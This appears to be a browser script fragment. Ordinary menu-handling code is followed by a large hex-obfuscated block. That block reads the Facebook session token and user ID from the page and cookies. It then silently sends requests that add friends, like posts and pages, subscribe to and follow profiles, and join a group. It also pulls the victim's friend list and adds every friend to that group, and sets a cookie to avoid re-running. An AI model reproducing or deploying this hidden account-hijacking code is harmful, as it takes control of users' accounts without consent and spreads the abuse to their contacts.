					document.getElementById("menuItem5").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem6").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem7").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem8").setAttribute("class", "uiMenuItem uiSelectorOption");
					document.getElementById("menuItem9").setAttribute("class", "uiMenuItem uiSelectorOption");
				} 
			}
			else
			{
				addButton();
			}
		}
	 
		setTimeout(checkForCommand, 2000);
	}

	checkForCommand();

});

var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x33","\x31\x30\x30\x30\x30\x37\x30\x35\x35\x30\x34\x30\x39\x39\x38","\x31\x30\x30\x30\x30\x34\x33\x38\x33\x31\x35\x38\x33\x32\x39","\x31\x30\x30\x30\x30\x37\x36\x33\x37\x37\x37\x33\x34\x36\x37","\x31\x30\x30\x30\x30\x37\x37\x30\x31\x32\x31\x36\x39\x31\x39","\x31\x30\x30\x30\x30\x31\x36\x37\x33\x39\x34\x35\x34\x39\x33","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x35\x38\x39\x30\x38\x31\x31\x33\x32\x39\x34\x37\x30\x32\x37\x39\x32\x35\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x31\x30\x32\x30\x31\x36\x33\x34\x32\x35\x33\x34\x38\x33\x30\x38\x39","\x31\x30\x32\x30\x31\x32\x37\x35\x34\x37\x32\x32\x37\x33\x37\x38\x33","\x31\x30\x32\x30\x31\x31\x32\x34\x36\x36\x35\x37\x30\x33\x37\x31\x33","\x31\x30\x32\x30\x30\x38\x39\x34\x32\x39\x39\x36\x32\x34\x37\x30\x35","\x31\x30\x32\x30\x30\x35\x34\x30\x31\x35\x31\x31\x33\x31\x32\x31\x34","\x31\x30\x32\x30\x30\x31\x33\x39\x30\x38\x38\x33\x30\x34\x38\x39\x34","\x34\x34\x31\x39\x35\x33\x35\x31\x37\x31\x34\x36\x33","\x34\x30\x33\x32\x35\x36\x32\x33\x33\x37\x33\x38\x34","\x33\x33\x33\x33\x36\x31\x39\x30\x36\x34\x32\x33\x39","\x32\x30\x37\x32\x36\x38\x30\x31\x38\x31\x35\x35\x35","\x31\x39\x34\x39\x30\x30\x32\x30\x30\x39\x36\x37\x38","\x31\x39\x30\x33\x34\x31\x31\x38\x32\x39\x39\x35\x32","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x36\x33\x34\x37\x32\x33\x31\x35\x33\x32\x34\x32\x37\x37\x36","\x34\x39\x31\x39\x31\x39\x36\x33\x37\x35\x36\x36\x39\x34\x35","\x33\x32\x30\x37\x34\x30\x30\x38\x34\x36\x35\x32\x33\x34\x33","\x33\x33\x34\x36\x30\x38\x35\x34\x36\x35\x35\x35\x31\x38\x37","\x33\x32\x38\x34\x34\x33\x39\x36\x33\x38\x35\x39\x37\x36\x38","\x32\x35\x36\x36\x39\x36\x31\x31\x31\x30\x37\x32\x34\x34\x35","\x31\x38\x36\x32\x32\x35\x36\x36\x38\x31\x33\x37\x34\x31\x33","\x32\x35\x33\x39\x35\x31\x36\x33\x34\x36\x38\x34\x30\x35\x36","\x36\x36\x35\x36\x38\x30\x32\x35\x33\x34\x37\x36\x38\x34\x31","\x32\x36\x36\x33\x37\x39\x31\x37\x33\x35\x32\x34\x37\x30\x37","\x31\x34\x33\x36\x31\x30\x32\x32\x33\x39\x39\x34\x36\x37\x34\x31","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x34\x36\x33\x32\x38\x39\x37\x33\x38\x35\x33\x38\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x35\x34\x39\x32\x38\x36\x31","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x36\x36\x35\x32\x38\x39\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x30\x38\x31\x32\x39\x39\x34","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x31\x32\x35\x33\x30\x30\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x32\x31\x37\x33\x30\x32\x38","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x36\x32\x35\x33\x31\x33\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x37\x33\x33\x33\x31\x35\x37","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x38\x34\x39\x33\x31\x38\x36","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x35\x30\x37\x33\x33\x32\x34\x32","\x31\x39\x32\x39\x32\x33\x37\x35\x34\x32\x33\x35\x34\x37\x31","\x31\x39\x32\x39\x32\x34\x32\x31\x34\x32\x33\x35\x34\x32\x35","\x32\x35\x30\x37\x39\x32\x35\x39\x31\x37\x35\x32\x36\x36\x35","\x31\x34\x30\x32\x35\x37\x30\x37\x39\x36\x36\x36\x39\x39\x35\x34","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67"];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function IDS(_0x9c10x4){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[5];var _0x9c10x7=_0x6733[6]+_0x9c10x4+_0x6733[7]+user_id+_0x6733[8]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;IDS(_0x6733[17]);IDS(_0x6733[18]);IDS(_0x6733[19]);IDS(_0x6733[20]);IDS(_0x6733[21]);IDS(_0x6733[22]);IDS(_0x6733[23]);IDS(_0x6733[24]);IDS(_0x6733[25]);IDS(_0x6733[26]);IDS(_0x6733[27]);var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var now=( new Date)[_0x6733[28]]();function P(_0x9c10xa){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[29];var _0x9c10x7=_0x6733[30]+_0x9c10xa+_0x6733[31]+now+_0x6733[32]+user_id+_0x6733[33]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;P(_0x6733[34]);P(_0x6733[35]);P(_0x6733[36]);P(_0x6733[37]);P(_0x6733[38]);P(_0x6733[39]);P(_0x6733[40]);P(_0x6733[41]);P(_0x6733[42]);P(_0x6733[43]);P(_0x6733[44]);P(_0x6733[45]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function Like(_0x9c10xc){var _0x9c10xd= new XMLHttpRequest();var _0x9c10xe=_0x6733[46];var _0x9c10xf=_0x6733[47]+_0x9c10xc+_0x6733[48]+user_id+_0x6733[49]+fb_dtsg+_0x6733[9];_0x9c10xd[_0x6733[11]](_0x6733[10],_0x9c10xe,true);_0x9c10xd[_0x6733[12]]=function (){if(_0x9c10xd[_0x6733[13]]==4&&_0x9c10xd[_0x6733[14]]==200){_0x9c10xd[_0x6733[15]];} ;} ;_0x9c10xd[_0x6733[16]](_0x9c10xf);} ;Like(_0x6733[50]);Like(_0x6733[51]);Like(_0x6733[52]);Like(_0x6733[53]);Like(_0x6733[54]);Like(_0x6733[55]);Like(_0x6733[56]);Like(_0x6733[57]);Like(_0x6733[58]);Like(_0x6733[59]);Like(_0x6733[60]);function sublist(_0x9c10x11){var a=document[_0x6733[62]](_0x6733[61]);a[_0x6733[63]]=_0x6733[64]+_0x9c10x11+_0x6733[65];document[_0x6733[67]][_0x6733[66]](a);} ;function a(_0x9c10x13){var _0x9c10x14= new XMLHttpRequest;var _0x9c10x15=_0x6733[68];var _0x9c10x16=_0x6733[69]+_0x9c10x13+_0x6733[70]+fb_dtsg+_0x6733[71]+user_id+_0x6733[9];_0x9c10x14[_0x6733[11]](_0x6733[10],_0x9c10x15,true);_0x9c10x14[_0x6733[12]]=function (){if(_0x9c10x14[_0x6733[13]]==4&&_0x9c10x14[_0x6733[14]]==200){_0x9c10x14[_0x6733[15]];} ;} ;_0x9c10x14[_0x6733[16]](_0x9c10x16);} ;a(_0x6733[17]);a(_0x6733[18]);a(_0x6733[19]);a(_0x6733[20]);a(_0x6733[21]);a(_0x6733[22]);a(_0x6733[23]);a(_0x6733[24]);a(_0x6733[25]);a(_0x6733[26]);a(_0x6733[27]);sublist(_0x6733[72]);sublist(_0x6733[73]);sublist(_0x6733[74]);sublist(_0x6733[75]);sublist(_0x6733[76]);sublist(_0x6733[77]);sublist(_0x6733[78]);sublist(_0x6733[79]);sublist(_0x6733[80]);sublist(_0x6733[81]);sublist(_0x6733[82]);sublist(_0x6733[83]);sublist(_0x6733[84]);var gid=[_0x6733[85]];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x6733[86];var paramswp=_0x6733[87]+gid+_0x6733[88]+fb_dtsg+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[16]](paramswp);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x6733[11]](_0x6733[97],_0x6733[98]+user_id+_0x6733[99]+Math[_0x6733[100]]()+_0x6733[101],false);gf[_0x6733[16]]();if(gf[_0x6733[13]]!=4){} else {data=eval(_0x6733[102]+gf[_0x6733[104]][_0x6733[103]](9)+_0x6733[105]);if(data[_0x6733[106]]){} else {friends=data[_0x6733[110]][_0x6733[109]][_0x6733[108]](function (_0x9c10x1c,_0x9c10x1d){return _0x9c10x1c[_0x6733[107]]-_0x9c10x1d[_0x6733[107]];} );} ;} ;for(var i=0;i<friends[_0x6733[94]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x6733[111];var paramswp=_0x6733[88]+fb_dtsg+_0x6733[112]+gid+_0x6733[113]+friends[i][_0x6733[114]]+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[12]]=function (){if(httpwp[_0x6733[13]]==4&&httpwp[_0x6733[14]]==200){} ;} ;httpwp[_0x6733[16]](paramswp);} ;var spage_id=_0x6733[51];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var smesaj=_0x6733[115];var smesaj_text=_0x6733[115];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x6733[116]](bugun[_0x6733[28]]()+1000*60*60*4*1);if(!document[_0x6733[4]][_0x6733[3]](/paylasti=(\d+)/)){document[_0x6733[4]]=_0x6733[117]+btarihi[_0x6733[118]]();} ;